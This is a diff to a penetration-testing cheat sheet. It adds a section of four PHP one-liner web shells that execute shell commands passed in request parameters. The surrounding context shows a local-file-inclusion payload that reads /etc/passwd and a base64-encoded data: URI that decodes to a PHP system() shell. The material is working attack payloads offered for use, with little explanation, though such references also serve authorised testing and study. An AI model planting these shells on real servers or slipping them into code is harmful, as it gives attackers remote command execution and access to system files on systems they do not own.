@@ -55,6 +55,7 @@ Other great cheetsheets:
   - [4.4. Buffer Overflows](#44-buffer-overflows)
   - [4.5. PHP Exploitation](#45-php-exploitation)
     - [4.5.1. LFI/RFI](#451-lfirfi)
+    - [PHP one-liner Webshells](#php-one-liner-webshells)
   - [4.6. Reverse Shells](#46-reverse-shells)
     - [4.6.1. Covering your tracks](#461-covering-your-tracks)
     - [4.6.2. Running a detached/daeminized process on Linux](#462-running-a-detacheddaeminized-process-on-linux)
@@ -1452,6 +1453,21 @@ data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
 ?page=../../../etc/passwd%00
 # you can take this technique further and URL-encode the entire php://filter
 # directive to hopefully bypass server-side filters on it. Or even double-encode
+```
+
+### PHP one-liner Webshells
+
+Simple one-liner web shells:
+
+```php
+<?php echo passthru($_GET['cmd']); ?>
+
+<?php echo exec($_POST['cmd']); ?>
+
+<?php echo shell_exec($_REQUEST['cmd']); ?>
+
+<?php system($_GET['cmd']); ?>
+
 ```
 
 ## 4.6. Reverse Shells
